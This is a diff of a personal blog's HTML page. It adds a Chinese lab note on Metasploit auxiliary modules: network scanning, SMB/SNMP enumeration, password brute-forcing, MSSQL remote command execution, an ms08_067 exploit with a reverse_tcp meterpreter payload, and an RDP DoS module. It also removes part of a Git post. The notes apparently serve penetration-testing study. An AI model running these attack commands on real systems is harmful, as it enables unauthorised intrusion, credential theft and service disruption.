@@ -413,6 +413,653 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/28/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%89)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Auxiliary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/28/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%89)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Auxiliary/" itemprop="url">Kali Linux笔记(一百零三)：MSF模块--Auxiliary</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-28T16:49:05+08:00">
+                2020-02-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.1k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-NMAP扫描"><a href="#1-NMAP扫描" class="headerlink" title="1. NMAP扫描"></a>1. NMAP扫描</h4><ul>
+<li><strong><code>🔺命令：db_nmap -sV 192.168.0.0/24</code></strong></li>
+</ul>
+<h4 id="2-主机发现和端口扫描"><a href="#2-主机发现和端口扫描" class="headerlink" title="2. 主机发现和端口扫描"></a>2. 主机发现和端口扫描</h4><ul>
+<li>主机发现<ul>
+<li>⭐ auxiliary/scanner</li>
+<li>RHOSTS &lt;&gt; RHOST <ul>
+<li>192.168.1.20-192.168.1.30，192.168.1.0/24，192.168.11.0/24 </li>
+<li>file:/root/h.txt</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>主机发现（UDP扫描）<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/discovery/udp_sweep</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS 192.168.1.100-192.168.1.130</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/discovery/udp_probe</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS 192.168.1.100-192.168.1.130</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>主机发现（ARP扫描）<ul>
+<li><strong><code>🔺命令：search arp</code></strong> <ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/discovery/arp_sweep</code></strong> <ul>
+<li><strong><code>🔺命令：set INTERFACE</code></strong>（扫描接口）</li>
+<li><strong><code>🔺命令：set ̵RHOSTS</code></strong>（目的IP地址）</li>
+<li><strong><code>🔺命令：set SHOST</code></strong>（源IP地址）</li>
+<li><strong><code>🔺命令：set SMAC</code></strong>（源MAC地址）</li>
+<li><strong><code>🔺命令：set PORTS</code></strong>（目标端口号）</li>
+<li><strong><code>🔺命令：set THREAD</code></strong>（线程数）</li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>端口扫描<ul>
+<li><strong><code>🔺命令：search postscan</code></strong><ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/portscan/syn</code></strong><ul>
+<li><strong><code>🔺命令：set INTERFACE eth0</code></strong></li>
+<li><strong><code>🔺命令：set RHOSTS 192.168.1.0/24</code></strong></li>
+<li><strong><code>🔺命令：set PORTS 80</code></strong></li>
+<li><strong><code>🔺命令：set THREADS 10</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-IPID-idle扫描"><a href="#3-IPID-idle扫描" class="headerlink" title="3. IPID idle扫描"></a>3. IPID idle扫描</h4><ul>
+<li>查找ipidseq主机<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ip/ipidseq</code></strong><ul>
+<li><strong><code>🔺命令：set INTERFACE eth0</code></strong></li>
+<li><strong><code>🔺命令：set RHOSTS 192.168.1.0/24</code></strong></li>
+<li><strong><code>🔺命令：set PORTS 80</code></strong></li>
+<li><strong><code>🔺命令：set THREADS 10</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong> </li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：nmap -Pn -sI 1.1.1.2 1.1.1.3</code></strong> </li>
+</ul>
+<h4 id="4-密码嗅探（Metasploit）"><a href="#4-密码嗅探（Metasploit）" class="headerlink" title="4. 密码嗅探（Metasploit）"></a>4. 密码嗅探（Metasploit）</h4><ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/sniffer/psnufle</code></strong><ul>
+<li>不选pacap抓包文件格式</li>
+<li>ftp登陆Metasploit，输入账号和密码，看是否能密码能被嗅探</li>
+</ul>
+</li>
+<li>▲ 支持从pcap抓包文件中提取密码</li>
+<li>功能类似于dsniff</li>
+<li>目前只支持pop3、imap、ftp、HTTP GET协议</li>
+</ul>
+<h4 id="5-SNMP扫描（Metasploit和Window-Server-2003）"><a href="#5-SNMP扫描（Metasploit和Window-Server-2003）" class="headerlink" title="5. SNMP扫描（Metasploit和Window Server 2003）"></a>5. SNMP扫描（Metasploit和Window Server 2003）</h4><ul>
+<li><strong><code>🔺命令：vi /etc/default/snmpd</code></strong> #Metasploit侦听地址修改为0.0.0.0<ul>
+<li><strong><code>🔺命令：./etc/init.d/snmpd stop</code></strong></li>
+<li><strong><code>🔺命令：./etc/init.d/snmpd start</code></strong></li>
+</ul>
+</li>
+<li>▲ 2020.2.27 Metasploit中无SNMP服务</li>
+<li>SNMP登陆<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_login</code></strong>（Linux）<ul>
+<li>使用默认爆破文件</li>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：set THREADS 10</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SNMP枚举<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_enum</code></strong>（Linux）<ul>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SNMP用户枚举<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_enumusers</code></strong>（windows）<ul>
+<li><strong><code>🔺命令：set RHOST Window Server 2003的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SNMP共享枚举<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_enumshares</code></strong>（windows）<ul>
+<li><strong><code>🔺命令：set RHOST Window Server 2003的IP</code></strong></li>
+<li><strong><code>🔺命令：show advanced/options</code></strong><ul>
+<li><strong><code>🔺命令：set VERBOSE true</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>▲ 无法显示隐藏的共享</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-SMB扫描（Metasploit和Window-Server-2003）"><a href="#6-SMB扫描（Metasploit和Window-Server-2003）" class="headerlink" title="6. SMB扫描（Metasploit和Window Server 2003）"></a>6. SMB扫描（Metasploit和Window Server 2003）</h4><ul>
+<li>SMB版本扫描<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_version</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Metasploit和Window Server</code></strong>2003的IP（▲中间需空格）</li>
+<li><strong><code>🔺命令：run</code></strong></li>
+<li><strong><code>🔺命令：set SMBPass/SMBUser</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>扫描命名管道，判断SMB服务类型（账号，密码）<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/pipe_auditor</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>扫描通过SMB管道可以访问的RCERPC服务<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/pipe_dcerpc_auditor</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Metasploit和Window Server 2003的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SMB共享枚举（账号，密码）<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_enumshares</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SMB用户共享（账号，密码）<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_enumusers</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SID枚举（账号，密码）<ul>
+<li>▲ 主板创建账号时，以毫米级的时间为基准创建的唯一安全标识符，抽象于账号名称</li>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/smb/smb_lookupsid</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Window Server 2003的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+<li><strong><code>🔺命令：set SMBPASS/SMBUSER</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>▲ 系统自生成的账号，Administrator的RID为500，Guest的RID为501，自创建的新账号从1000开始，一般安全人员会对Administrator的名称进行修改成一个不其起眼的账号名称，另设一个权限非常小且密码复杂的名字为Administrator的非管理员权限账号</li>
+</ul>
+</li>
+</ul>
+<h4 id="7-SSH扫描（Metasploit）"><a href="#7-SSH扫描（Metasploit）" class="headerlink" title="7. SSH扫描（Metasploit）"></a>7. SSH扫描（Metasploit）</h4><ul>
+<li>SSH版本扫描<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/ssh_version</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SSH密码爆破<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/ssh_login</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</code></strong>（可在字典中添加正确的密码）</li>
+<li><strong><code>🔺命令：set VERBOSE false</code></strong> </li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>SSH公钥登陆<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/ssh_login_pubkey</code></strong><ul>
+<li><strong><code>🔺命令：set KEY_FILE id_rsa</code></strong> </li>
+<li><strong><code>🔺命令：set USERNAME root</code></strong> </li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="8-SQL-Server扫描（安装有sql-server的Window-7）"><a href="#8-SQL-Server扫描（安装有sql-server的Window-7）" class="headerlink" title="8. SQL Server扫描（安装有sql server的Window 7）"></a>8. SQL Server扫描（安装有sql server的Window 7）</h4><ul>
+<li>▲ 2020.2.28 Window 7无安装sql server</li>
+<li>Mssql扫描端口<ul>
+<li>▲ TCP/IP连接需要开启/sql server的网络服务需要开启</li>
+<li>TCP 1433（动态端口）/ UDP 1434（查询TCP端口号，mssql）</li>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/mssql/mssql_ping</code></strong> <ul>
+<li><strong><code>🔺命令：set RHOSTS Window 7的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong>（可查到随机动态高危端口）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>爆破mssql密码<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/mssql/mssql_login</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Window 7的IP</code></strong></li>
+<li><strong><code>🔺命令：set username sa</code></strong></li>
+<li><strong><code>🔺命令：set password /usr/share/password.txt</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>远程执行代码<ul>
+<li>▲ 从端口扫描和密码爆破的端口和密码可用于远程代码执行</li>
+<li>⭐ <strong><code>🔺命令：use auxiliary/admin/mssql/mssql_exec</code></strong><ul>
+<li><strong><code>🔺命令：set RHOST Window 7的IP</code></strong></li>
+<li><strong><code>🔺命令：set PASSWORD</code></strong></li>
+<li><strong><code>🔺命令：set RPORT</code></strong></li>
+<li><strong><code>🔺命令：set CMD net user user pass /ADD</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="9-FTP扫描（Metasploit）"><a href="#9-FTP扫描（Metasploit）" class="headerlink" title="9. FTP扫描（Metasploit）"></a>9. FTP扫描（Metasploit）</h4><ul>
+<li>FTP版本扫描<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ftp/ftp_version</code></strong><ul>
+<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ftp/anonymous</code></strong><ul>
+<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>⭐ use auxiliary/scanner/ftp/ftp_login`**<ul>
+<li><strong><code>🔺命令：set RHOST Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="10-系统补丁"><a href="#10-系统补丁" class="headerlink" title="10. 系统补丁"></a>10. 系统补丁</h4><ul>
+<li>Windows缺少的补丁（Window XP SP3）</li>
+<li>上微软的官网查看ms08-067对应的KB编号<ul>
+<li>▲ 基于已经取得session进行检测</li>
+<li>⭐ <strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Window XP的IP</code></strong></li>
+<li><strong><code>🔺命令：set target 34</code></strong></li>
+<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
+<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
+<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
+<li><strong><code>🔺命令：exploit</code></strong></li>
+<li><strong><code>🔺命令：migrate 1060</code></strong>（其他模块）</li>
+<li><strong><code>🔺命令：background</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>⭐ <strong><code>🔺命令：use post/windows/gather/enum_patches</code></strong> <ul>
+<li><strong><code>🔺命令：set session 1</code></strong></li>
+<li><strong><code>🔺命令：set KB KB958644</code></strong></li>
+<li><strong><code>🔺命令：show options</code></strong></li>
+<li><strong><code>🔺命令：set VERBOSE yes</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>▲ 查看是否KB958644为missing</li>
+<li>▲ 检查失败<ul>
+<li>Known bug in WMI query, try migrating to another process</li>
+<li>迁移到另一个进程再次尝试</li>
+</ul>
+</li>
+<li>▲ 2020.2.28 此模块使用后返回数据过于奇怪</li>
+</ul>
+</li>
+</ul>
+<h4 id="11-应用弱点扫描（Metasploit、Window-XP-SP3和Window-7）"><a href="#11-应用弱点扫描（Metasploit、Window-XP-SP3和Window-7）" class="headerlink" title="11. 应用弱点扫描（Metasploit、Window XP SP3和Window 7）"></a>11. 应用弱点扫描（Metasploit、Window XP SP3和Window 7）</h4><ul>
+<li>根据信息收集结果搜索漏洞利用模块</li>
+<li>结合外部漏洞扫描系统对大IP地址段进行批量扫描</li>
+<li>误判率、漏判率</li>
+<li>VNC密码破解<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vnc/vnc_login</code></strong><ul>
+<li><strong><code>🔺命令：set BLANK_PASSWORD yes</code></strong></li>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：set THREADS 30</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>VNC无密码访问<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vnc/vnc_none_auth</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>supported：None, free access!</li>
+</ul>
+</li>
+<li>RDP远程桌面漏洞<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/rdp/ms12_020_check</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Window XP SP和Window 7的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>检查不会造成DoS攻击</li>
+<li>⭐ <strong><code>🔺命令：use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code></strong><ul>
+<li><strong><code>🔺命令：set RHOST Window XP的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>此模块会造成DoS攻击</li>
+</ul>
+</li>
+<li>设备后门<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/juniper_backdoor</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS juniper的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ssh/fortinet_backdoor</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS fortinet的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>VMWare ESXi 密码爆破<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vmware/vmauthd_login</code></strong><ul>
+<li><strong><code>🔺命令：set BLANK_PASSWORD yes</code></strong></li>
+<li><strong><code>🔺命令：set RHOSTS 网段</code></strong></li>
+<li><strong><code>🔺命令：set PASSWORD 查询密码</code></strong></li>
+<li><strong><code>🔺命令：set PASS_FILE 密码文件</code></strong></li>
+<li><strong><code>🔺命令：set USERNAME 账号名称</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/vmware/vmware_enum_vms</code></strong><ul>
+<li><strong><code>🔺命令：set PASSWORD 已破解主机的密码</code></strong></li>
+<li><strong><code>🔺命令：set RHOSTS 已破解主机的IP</code></strong></li>
+<li><strong><code>🔺命令：set USERNAME 已破解主机的账号名称</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>利用WEB API远程开启虚拟机<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/admin/vmware/poweron_vm</code></strong><ul>
+<li><strong><code>🔺命令：set PASSWORD 已破解主机的密码</code></strong></li>
+<li><strong><code>🔺命令：set RHOSTS 已破解主机的IP</code></strong></li>
+<li><strong><code>🔺命令：set USERNAME 已破解主机的账号名称</code></strong></li>
+<li><strong><code>🔺命令：set VM 要开启的虚拟机</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="12-HTTP弱点扫描（Metasploit）"><a href="#12-HTTP弱点扫描（Metasploit）" class="headerlink" title="12. HTTP弱点扫描（Metasploit）"></a>12. HTTP弱点扫描（Metasploit）</h4><ul>
+<li>过期证书<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/cert</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS 目标主机的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>显示目录及文件<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/dir_listing</code></strong>（目录遍历）<ul>
+<li><strong><code>🔺命令：set PATH 设置要查询的目录</code></strong></li>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/files_dir</code></strong>（爬网爆破模块）<ul>
+<li><strong><code>🔺命令：set Dictionary /usr/share/metasploit-framework/data/wmap/wmap_files.txt</code></strong></li>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>WebDAV Unicode编码身份验证绕过<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/dir_webdav_unicode_bypass</code></strong><ul>
+<li><strong><code>🔺命令：set Dictionary /usr/share/metasploit-framework/data/wmap/wmap_files.txt</code></strong></li>
+<li><strong><code>🔺命令：set HTTP404S /usr/share/metasploit-framework/data/wmap/wmap_404s.txt</code></strong></li>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Tomcat管理登陆页面<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/tomcat_mgr_login</code></strong><ul>
+<li><strong><code>🔺命令：set PASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt</code></strong></li>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>基于HTTP方法的身份验证绕过<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/verb_auth_bypass</code></strong><ul>
+<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
+<li><strong><code>🔺命令：run</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Wordpress密码爆破<ul>
+<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/http/wordpress_login_enum</code></strong><ul>
+<li><strong><code>🔺命令：set URI/wordpress/wp-login.php</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="13-WMAP-WEB应用扫描器"><a href="#13-WMAP-WEB应用扫描器" class="headerlink" title="13. WMAP WEB应用扫描器"></a>13. WMAP WEB应用扫描器</h4><ul>
+<li>根据SQLMAP的工作方式开发</li>
+<li><strong><code>🔺命令：load wmap</code></strong></li>
+<li><strong><code>🔺命令：wmap_sites -a http://Metasploit的IP</code></strong><ul>
+<li>-a：列出url的站点</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：wmap_targets -t http://Metasploit的IP/mutillidae/index.php</code></strong><ul>
+<li>-t：指定具体扫描目标</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：wmap_run -t</code></strong><ul>
+<li>-t：显示具体模块被使用</li>
+<li>-e：执行，具体执行的模块 </li>
+</ul>
+</li>
+<li><strong><code>🔺命令：wmap_vulns -l</code></strong><ul>
+<li>-l：查看已经发现的漏洞结果</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：vulns</code></strong></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%BA%8C)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Payload%E3%80%81Encoders/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2206,226 +2853,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/Git%E7%AC%94%E8%AE%B0-6%EF%BC%9Agitignore%E5%92%8Cfork%E5%90%8C%E6%AD%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/20/Git%E7%AC%94%E8%AE%B0-6%EF%BC%9Agitignore%E5%92%8Cfork%E5%90%8C%E6%AD%A5/" itemprop="url">Git笔记-6：gitignore和fork同步</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T16:24:49+08:00">
-                2020-02-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Git/" itemprop="url" rel="index">
-                    <span itemprop="name">Git</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  261 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="1-gitignore-fork同步"><a href="#1-gitignore-fork同步" class="headerlink" title="1. gitignore/fork同步"></a>1. gitignore/fork同步</h4><ul>
-<li>创建一个.gitignore文件，保存要忽略的内容<ul>
-<li>忽略系统生成的文件，如IDE的配置</li>
-<li>忽略编译生成的中间文件、可执行文件等</li>
-<li>忽略敏感的配置文件和本地不想提交的脚本</li>
-</ul>
